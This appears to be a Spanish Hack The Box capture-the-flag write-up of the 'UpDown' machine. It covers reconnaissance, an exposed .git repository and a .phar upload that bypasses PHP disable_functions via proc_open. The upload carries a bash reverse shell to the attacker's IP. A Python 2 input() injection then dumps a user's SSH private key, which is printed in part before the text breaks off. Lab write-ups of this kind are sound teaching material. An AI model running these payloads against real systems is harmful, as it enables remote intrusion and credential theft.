---
title: "HTB: Resolución de Updown"
date: 2023-01-21 06:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [git logs, php, disable_funcions bypass,suid,sudoers]     ## TAG names should always be lowercase
image: updown.jpg
img_path: /photos/2023-01-21-UpDown-WriteUp/
---

***UpDown*** es una máquina ***Linux*** con dos servicios expuestos, *HTTP* y *SSH*. En primer lugar, conseguiremos obtener acceso a un **subdominio** gracias a la información que encontraremos en un ***.git*** expuesto en la página web. Para obtener una *shell* como *www-data*, podremos subir un archivo *PHP* con extensión *.phar* y utilizaremos la función *proc_open()* para burlar las *disable_functions*. Para escalar a *root*, primero **pivotaremos** al usuario *developer* aprovechándonos de un **binario SUID** y explotando la función *input()* de **Python 2**. Finalmente, conseguiremos **máximos permisos** a través de un privilegio que tenemos asignado a nivel de ***sudoers***.

## Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="logo.png" alt="drawing" width="465"/>  
        </td>
        <td>
            <img src="stats.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>


## Reconocimiento

### ping 

Vamos a enviar un _ping_ a la máquina víctima con la finalidad de conocer su sistema operativo y saber si tenemos conexión con la misma. Un _TTL_ menor o igual a 64 significa que la máquina es _Linux_ y un _TTL_ menor o igual a 128 significa que la máquina es _Windows_.

```bash
ping -c 1 10.10.11.177  
PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.
64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=105 ms

--- 10.10.11.177 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.280/105.280/105.280/0.000 ms
```

Vemos que nos enfrentamos a una máquina **_Linux_**, ya que su *TTL* es 63.

### Port discovery

Procedemos ahora a escanear todo el rango de puertos de la máquina víctima, con la finalidad de encontrar aquellos que estén abiertos (_status open_). Lo haremos con la herramienta ***nmap***.

```bash
sudo nmap -sS --min-rate 5000 -n -Pn --open -p- -vvv 10.10.11.177 -oG allPorts
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-16 23:10 CET
Nmap scan report for 10.10.11.177
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

**-sS** efectúa un _TCP SYN Scan_, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple _verbose_ para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**-oG** exportará la evidencia en formato _grepeable_ al fichero *allPorts* en este caso.

Hemos encontrado **dos puertos abiertos**, el **22** y **80**. Un **puerto abierto** está **escuchando solicitudes de conexión entrantes**.

Vamos a lanzar una serie de _scripts_ básicos de enumeración, en busca de los servicios que están corriendo y de sus versiones.

```python
nmap -sCV -p22,80 10.10.11.177 -oN targeted
Nmap scan report for 10.10.11.177
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El puerto **22** es **SSH** y el puerto **80** **HTTP**. De momento, al no disponer de credenciales para autenticarnos port _SSH_, nos centraremos en auditar el puerto **80**.

### Puerto 80 abierto (HTTP)

#### Tecnologías utilizadas 

Utilizaremos **_whatweb_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

```python
whatweb http://10.10.11.177
http://10.10.11.177 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.177], Title[Is my Website up ?], X-UA-Compatible[chrome=1]
```

La web está empleando como servidor _Apache 2.4.41_. El título de la página web es *Is my Website up ?*.

#### Análisis de la web

Cuando accedemos a **http://10.10.11.177** vemos lo siguiente:

![imagen 1](Pasted image 20230116231339.png)

Se trata de una página web que **comprueba si una URL está activa**. Antes de ver su funcionamiento, en la parte inferior nos encontramos con un dominio `siteisup.htb`. Lo podemos incluir en nuestro */etc/hosts* y verificar si `http://siteisup.htb` resuelve a otra página web. Deberemos incluir la siguiente línea: `10.10.11.177 siteisup.htb`. En este caso, dominio e IP nos redirigen a la misma web.

Para entender el funcionamiento de la web, podemos desplegar un servidor en *python* con el comando `sudo python3 -m http.server 80`. Con el *Debug mode* activado, si la web se encuentra activa, nos volcará el contenido HTML de la misma. De esta forma, si introducimos `http://<ip_tun0>` obtendremos el siguiente resultado:

![imagen 2](Pasted image 20230116232029.png)

#### Intento de SSRF

¿Que pasaría si pudiésemos introducir una URL que apunte a la máquina víctima, por ejemplo http://siteisup.htb, con el *debug mode* activado? Podríamos visualizar el código HTML. En este caso, ya tenemos acceso al código fuente desde el navegador, pero, ¿Y si corre otro servicio web en otro puerto de la máquina víctima en el que no tenemos acceso desde el exterior? Esto se conoce como un ataque **SSRF**. 

Un ataque ***SSRF (Server-Side Request Forgery)*** es una técnica utilizada por atacantes para forzar a un servidor web a realizar solicitudes de red a direcciones IP o dominios específicos. Esto permite a los atacantes acceder a **información confidencial** o llevar a cabo acciones malintencionadas **en nombre del servidor**.

En este caso, lograremos como atacantes que el servidor web víctima envíe solicitudes a servicios internos, que normalmente no estarían disponibles de cara al exterior. Podemos comprobar si el ataque funciona introduciendo la URL `http://localhost`:

![imagen 3](Pasted image 20230117114014.png)

Efectivamente, nos muestra el esqueleto de `http://siteisup.htb`. Para llevar a cabo un escaneo interno de puertos, utilizaré la herramienta *wfuzz* con los siguientes parámetros:

```bash
wfuzz -c -u 'http://siteisup.htb/' -d 'site=http://localhost:FUZZ&debug=1' -z range,1-65535 --hw=99
```

**-c** es formato colorizado.  
**–hw=99** para esconder todas aquellas respuestas que contengan 99 palabras (las páginas que no están disponibles devuelven esta cantidad de caracteres).  
**-z** para especificar el tipo de *payload*. En este caso, estamos especificando un *payload* del tipo rango, que iterará desde el 1 hasta el 65535 (todo el rango de puertos).  
**-u** para especificar la _url_.  
**-d** para especificar los datos que se tramitarán por POST. _FUZZ_ es un término de _wfuzz_ donde se va a sustituir cada valor del *payload*.

Pasado un tiempo, obtendremos el siguiente resultado:

```bash
documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://siteisup.htb/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000080:   200        85 L     209 W      2561 Ch     "80" 
```

Aunque la web es vulnerable a *SSRF*, **no descubriremos ningún servicio interno** aparte de `http://localhost:80` que es `http://siteisup.htb`. En este punto, vamos a aplicar más reconocimiento. 

#### Fuzzing de directorios 

Vamos a **buscar directorios** que se encuentren bajo el dominio `htpp://siteisup.htb`. Lo haremos con la herramienta *gobuster* (es equivalente a *wfuzz*, pero suele ser más rápida en ocasiones):

```bash
gobuster dir -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/16 23:39:38 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
```

**dir** para indicar que queremos aplicar *fuzzing* de directorios.
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ directorios siempre suele emplear el mismo, _directory-list-2.3-medium.txt_. Este diccionario se puede encontrar en el propio _Parrot OS_ o en _Kali_. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-t 50** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido, pero menos fiable.  

Nos encuentra un directorio */dev*. En esta clase de **directorios de desarrollo** es relativamente común encontrar un directorio ***.git*** expuesto. *.git* es un sistema de control de versiones distribuido, utilizado para llevar un **registro de los cambios realizados** en un proyecto de software.

![imagen 4](Pasted image 20230116234144.png)

Exponer este directorio puede ser muy peligroso, ya que el atacante podría tener acceso al **contenido** de los **cambios** que se han realizado **en un proyecto**.

#### Inspeccionando git logs

Con el comando`wget -r http://siteisup.htb/dev/.git/` podremos descargar el **.git**. Para listar los logs, nos tenemos que situar en la carpeta *.git* y utilizar el comando `git log`:

![imagen 5](Pasted image 20230117121438.png)

Cada *log* tiene asociado un identificador. Con el comando `git show <log_identifier>` podemos visualizar el contenido de un *log*. Por ejemplo, para volcar el contenido del *log* *010dcc30cc1e89344e2bdbd3064f61c772d89a34* haremos:

```bash
git show 010dcc30cc1e89344e2bdbd3064f61c772d89a34
```

```bash
commit 010dcc30cc1e89344e2bdbd3064f61c772d89a34 (HEAD -> main, origin/main, origin/HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:51 2021 +0200

    Delete index.php

diff --git a/uploads/index.php b/uploads/index.php
deleted file mode 100644
index 8b13789..0000000
--- a/uploads/index.php
+++ /dev/null
@@ -1 +0,0 @@
-
```

Encontraremos **dos *logs* interesantes**: el primero tiene como descripción *New technique in header to protect our dev vhost.*:

```bash
git show 8812785e31c879261050e72e20f298ae8c43b565
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
```

Puede que haya un subdominio `dev` cuyo contenido solo pueda ser mostrado si se emplea la cabecera `Special-Dev: only4dev`. 

El segundo *log* interesante nos muestra el código *php* de una funcionalidad llamada *checker.php*:

```php
<?php
if(DIRECTACCESS){
       die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
                           <label>List of websites to check:</label><br><br>
                               <input type="file" name="file" size="50">
                               <input name="check" type="submit" value="Check">
               </form>

<?php

function isitup($url){
       $ch=curl_init();
       curl_setopt($ch, CURLOPT_URL, trim($url));
       curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
       curl_setopt($ch, CURLOPT_HEADER, 1);
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
       curl_setopt($ch, CURLOPT_TIMEOUT, 30);
       $f = curl_exec($ch);
       $header = curl_getinfo($ch);
       if($f AND $header['http_code'] == 200){
               return array(true,$f);
       }else{
               return false;
       }
    curl_close($ch);
}

if($_POST['check']){
  
       ## File size must be less than 10kb.
       if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
  }
       $file = $_FILES['file']['name'];
       
       ## Check if extension is allowed.
       $ext = getExtension($file);
       if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
               die("Extension not allowed!");
       }
  
       ## Create directory to upload our file.
       $dir = "uploads/".md5(time())."/";
       if(!is_dir($dir)){
        mkdir($dir, 0770, true);
  }
  
  ## Upload the file.
       $final_path = $dir.$file;
       move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
       
  ## Read the uploaded file.
       $websites = explode("\n",file_get_contents($final_path));
       
       foreach($websites as $site){
               $site=trim($site);
               if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                       $check=isitup($site);
                       if($check){
                               echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                       }else{
                               echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                       }       
               }else{
                       echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
               }
       }
       
  ## Delete the uploaded file.
       @unlink($final_path);
}

function getExtension($file) {
       $extension = strrpos($file,".");
       return ($extension===false) ? "" : substr($file,$extension1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

A grandes rasgos, parece leer un fichero que contiene sitios web, indicando si están activos. No está relacionado con ninguna funcionalidad de la página principal http://siteisup.htb. 

Como en el anterior *log* nos hablaban de *vhosts*, vamos a buscar subdominios que se encuentren bajo *siteisup.htb*.

#### Fuzzing de subdominios

Los *logs* anteriores ya nos hablaban de un subdominio *dev*. Aun así, lanzaremos la herramienta ***gobuster***:

```bash
gobuster vhost -u http://siteisup.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://siteisup.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/16 23:14:57 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb (Status: 403) [Size: 281]
```

**vhost** para aplicar *fuzzing* de subdominios.
**-u** para especificar la _url_.  
**-w** para especificar el diccionario. Para _fuzzear_ subdominios siempre suele emplear el mismo,  *subdomains-top1million-110000.txt* . Se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-t 50** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido, pero menos fiable.  

Efectivamente, ***dev*** existe. Para poder resolver a **_dev.siteisup.htb_**, deberemos introducirlo en nuestro _/etc/hosts_:

```bash
10.10.11.177 siteisup.htb dev.siteisup.htb
```

Lo primero que vemos al acceder a http://dev.siteisup.htb es un *Access forbidden*. Aquí es donde entra en juego la cabecera de la que nos estaban hablando anteriormente: *Special-Dev: only4dev*. Podemos interceptar la petición con *BurpSuite* e introducirla:

![imagen 6](Pasted image 20230116235133.png)

Ahora ya podemos ver el contenido de la página web. Introducir constantemente la cabecera en la petición puede ser tedioso. *BurpSuite* ofrece una funcionalidad que introduce la cabecera automáticamente si pasamos la *request* por el *proxy*:

Deberemos ir a la configuración del *proxy* y en *Match and Replace* añadiremos la siguiente entrada:

![imagen 7](Pasted image 20230116235329.png)

#### Subdominio dev.siteisup.htb

##### Tecnologías utilizadas 

Utilizaremos la extensión de navegador **_wappalyzer_** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

![imagen 8](Pasted image 20230117133623.png)

Como servidor está empleando *nginx 2.4.41* y como lenguaje de programación *PHP*.

##### Inspección de la web

Si accedemos a http://dev.siteisup.htb nos encontramos con lo siguiente:

![imagen 9](Pasted image 20230116235507.png)

Nos pide una **lista de sitios web para analizar**. Justo la funcionalidad del *script php* que encontramos anteriormente en los *git logs*, *checker.php*.

##### Analizando checker.php

Vamos a desglosar el funcionamiento de *checker.php*:

```php
## File size must be less than 10kb.
if ($_FILES['file']['size'] > 10000) {
	die("File too large!");
}
   $file = $_FILES['file']['name'];
```

El fichero subido tiene que pesar **menos de 10kb**.

```php
## Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
	   die("Extension not allowed!");
}
```

Si la extensión coincide con una de las especificadas en el patrón de la expresión regular (*php, php seguido de un número, html, py, pl, phtml, zip, rar, gz, gzip o tar*), el programa termina con un mensaje *"Extension not allowed!".*

```php
## Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
mkdir($dir, 0770, true);
```

Crea un directorio en ***/uploads/\<dir\>***.

```php
## Upload the file.
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

Mueve el fichero subido al directorio anteriormente generado.

```php
## Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));
       
foreach($websites as $site){
	   $site=trim($site);
	   if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			   $check=isitup($site);
			   if($check){
					   echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			   }else{
					   echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			   }       
	   }else{
			   echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
	   }
}
```

Lee el contenido del fichero y por cada URL nos dice si está activa o no.

```php
## Delete the uploaded file.
@unlink($final_path);
```

Finalmente, borra el fichero.

En resumen, podemos subir un archivo que pese menos de *10kB*. La web **comprueba** que la **extensión** sea correcta. **Genera** una **carpeta** en el directorio *uploads*. **Moverá** nuestro **archivo** en esa carpeta:

![imagen 10](Pasted image 20230117000528.png)

Si el **archivo** es suficientemente **largo**, nos dará tiempo a **visualizarlo** (recordemos que se borrará después que hayan sido procesadas todas las URL):

![imagen 11](Pasted image 20230117000544.png)

## Consiguiendo shell como www-data

### Subida de un archivo .phar

Una extensión que no se contempla en el listado de extensiones maliciosas es la extensión *.phar*. *.phar* es una extensión de archivo que representa un archivo de paquete PHP. Estos archivos se pueden distribuir y **ejecutar de manera similar a cualquier otro script PHP**. 

Podemos intentar subir un archivo malicioso *websites.phar* que contenga código en PHP para ver si lo interpreta. Para ello, escribiremos la siguiente línea:

```php
<?php phpinfo() ?>
```

*phpinfo()* es una función predefinida en PHP que se utiliza para mostrar información detallada sobre la configuración actual de PHP en el servidor web.

Recordemos que, para que nos dé tiempo a visualizar el contenido del fichero antes de ser borrado, este debe incluir el mayor número de direcciones web posibles. El resultado es el siguiente:

![imagen 12](Pasted image 20230117000751.png)

**Nos interpreta nuestro código *PHP***. Ahora podemos emplear una función que nos permita ejecutar comandos y podernos enviarnos una *reverse shell*. *phpinfo()* contempla una sección de funciones deshabilitadas llamada *disable_functions*:

![imagen 13](Pasted image 20230117000931.png)

### disable_functions bypass

Las típicas funciones de ejecución de comandos como *system, exec, shell_exec, popen, passthru…* están deshabilitadas. Sin embargo, existe una llamada *proc_open*, que no lo está ([Hacktricks disable_functions bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)).  En este [link](https://tecfa.unige.ch/guides/php/php5/function.proc-open.html), podemos encontrar un ejemplo de utilización de esta función. En nuestro caso, queremos abrir un *bash* y ejecutar como prueba un `ping -c 1 <ip_tun0>` :

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('bash', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'ping -c 1 10.10.14.127');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

Lo subimos, lo abrimos y nos debería llegar dos trazas *ICMP*:

```bash
sudo tcpdump -n icmp -i  tun0
00:58:21.314558 IP 10.10.11.177 > 10.10.14.127: ICMP echo request, id 2, seq 1, length 64
00:58:21.314683 IP 10.10.14.127 > 10.10.11.177: ICMP echo reply, id 2, seq 1, length 64
```

Como ya sabemos que funciona, nos enviaremos una *reverse shell* con el comando `bash -c "bash -i >& /dev/tcp/<ip_tun0>/<puerto_deseado> 0>&1"` :

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');
$process = proc_open('bash', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'bash -c "bash -i >& /dev/tcp/10.10.14.127/443 0>&1"');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

Antes de subirlo, nos ponemos en escucha con *netcat* por el puerto que hayamos elegido. Finalmente, subimos el archivo y al visualizarlo nos debería de haber llegado una *shell*:

```bash
sudo nc -nlvp 443
[sudo] password for r1pfr4n: 
listening on [any] 443 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.177] 36148
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/tmp$ 
```

Una vez recibida la consola, deberemos hacerle un **tratamiento** para que nos permita ejecutar _Ctrl+C_, borrado de los comandos, movernos con las flechas, etc. Los comandos que ingresaremos serán:

```bash
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos ajustar el número de filas y de columnas de esta _shell_. Con el comando **_stty size_** podemos consultar nuestras filas y columnas y con el comando **_stty rows <\rows\> cols \<cols\>_** podemos ajustar estos campos.

Ahora deberemos escalar privilegios para convertirnos en el usuario ***developer***.

## Consiguiendo shell como developer

### Reconocimiento del sistema

#### Binarios SUID

Cuando se ejecuta un binario *SUID*, el sistema operativo asigna los permisos del propietario del archivo al usuario que lo ejecuta, en lugar de los permisos del usuario que lo ejecuta.  Esto puede representar un riesgo de seguridad, ya que un atacante malicioso podría aprovecharse de un archivo *SUID* para obtener privilegios elevados en el sistema. 

El comando que utilizaremos para listar archivos *SUID* es:

```bash
www-data@updown:/tmp$  find / -perm -4000 2>/dev/null
```

```bash
[...]
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
```

Todos son binarios comunes en máquinas *Linux* menos el último, */home/developer/dev/siteisup*. Si listamos los permisos del archivo:

```bash
www-data@updown:/tmp$  ls -l /home/developer/dev/siteisup 
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 /home/developer/dev/siteisup
```

Podemos ejecutar como *developer* el binario *siteisup*. Si lo ejecutamos, comprobaremos que la funcionalidad es la misma que la que podemos encontrar en http://siteisup.htb:

```bash
www-data@updown:/tmp$ /home/developer/dev/siteisup 
Welcome to 'siteisup.htb' application

Enter URL here:"http://10.10.14.127"
Website is up
```

Dada una URL, nos indica si está activa. Si con el comando *strings* listamos las cadenas de caracteres imprimibles:

```bash
www-data@updown:/tmp$ strings /home/developer/dev/siteisup
[...]
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
[...]
```

Nos damos cuenta de que el binario está llamando a un script de *Python* llamado *siteisup_test.py*. Su contenido es el siguiente:

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

Básicamente contiene la lógica del binario. Otro punto interesante es la versión de *Python* que se está utilizando para ejecutar el *script*:

```bash
www-data@updown:/tmp$ which python | xargs ls -l
lrwxrwxrwx 1 root root 7 Apr 15  2020 /usr/bin/python -> python2
```

Se está utilizando *Python 2*. La función *input()* de *Python 2*, presenta una vulnerabilidad muy grave.

### Explotando función input() de Python 2

#### Contexto

Hay **dos métodos comunes** para recibir **entradas** en Python 2.x:

1. Uso de la función *input()*: esta función toma el valor y el tipo de la entrada que ingresa tal como está sin modificar ningún tipo.
2. Uso de la función *raw_input():* esta función convierte explícitamente la entrada que proporciona en un *string*.

En nuestro caso, como en el script anterior se está empleando *input()*, la vulnerabilidad radica en que podemos proporcionar el **nombre de una función** como valor de entrada.

En *Python 3*, la función *raw_input()* se borró y su funcionalidad se transfirió a una nueva función integrada conocida como *input()*. Todo esto está explicado con más detenimiento en este [enlace](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/).

#### Explotación

La **función** que introduciremos como entrada será la siguiente:

```python
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```

Importamos la librería ***os*** y ejecutamos un comando a nivel de sistema que nos volcará la **clave privada** del usuario *developer*:

```python
www-data@updown:/tmp$ /home/developer/dev/siteisup 
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
u0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ck
IsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2
EAAAGBAJrweNE1jPHrtJ+hTs4sUwNaUN/UqcGMq2Aoyqw7afIORNORBHCcP0taovTxaDb8
5Le1Mt/vusQ3feboAHbbkS+6swNN8UjZKp7dh4IygDzq+nLSLzA6YfCXgRdhfUsuF67Xwj
++vlqc5sU+7rbxg9DdQGN/hBkaTm+6ufV9KXD0ZyFJ8btrDfryF43xr6ogGKMzgeQ3l/K2
9m5Ioukt0NbTNVVA6Fu3AkW5wTIJZthVxCVPZRL/T8tg+AWrxb6FKrU/GgqLK6yr06QEJD
6734qEobSKaPeRn8segY9jCiekLoYiSvjts2JtM9ro4wl7jN1eCW9CNVHfqmvkLcU7DUFa
XCLnLdOsU31V3hLT04WiyOSpFxJcfk4MEdOt948EaX8dXlYCwscWJOQmqR7rtJ4VKSAlNR
V6+rVdrhNSyG+UyawiMeO/RJW3NTD6xgpLEFVfBHrCO5JOQNkq5zTMS3tnJCLEB0B8SHIr
wgiMweEfRWzinUismUx3mc4z8J1PhQAAAAMBAAEAAAGAMhM4KP1ysRlpxhG/Q3kl1zaQXt
b/ilNpa+mjHykQo6+i5PHAipilCDih5CJFeUggr5L7f06egR4iLcebps5tzQw9IPtG2TF+
ydt1GUozEf0rtoJhx+eGkdiVWzYh5XNfKh4HZMzD/sso9mTRiATkglOPpNiom+hZo1ipE0
NBaoVC84pPezAtU4Z8wF51VLmM3Ooft9+T11j0qk4FgPFSxqt6WDRjJIkwTdKsMvzA5XhK
rXhMhWhIpMWRQ1vxzBKDa1C0+XEA4w+uUlWJXg/SKEAb5jkK2FsfMRyFcnYYq7XV2Okqa0
NnwFDHJ23nNE/piz14k8ss9xb3edhg1CJdzrMAd3aRwoL2h3Vq4TKnxQY6JrQ/3/QXd6Qv
ZVSxq4iINxYx/wKhpcl5yLD4BCb7cxfZLh8gHSjAu5+L01Ez7E8MPw+VU3QRG4/Y47g0cq
DHSERme/ArptmaqLXDCYrRMh1AP+EPfSEVfifh/ftEVhVAbv9LdzJkvUR69Kok5LIhAAAA
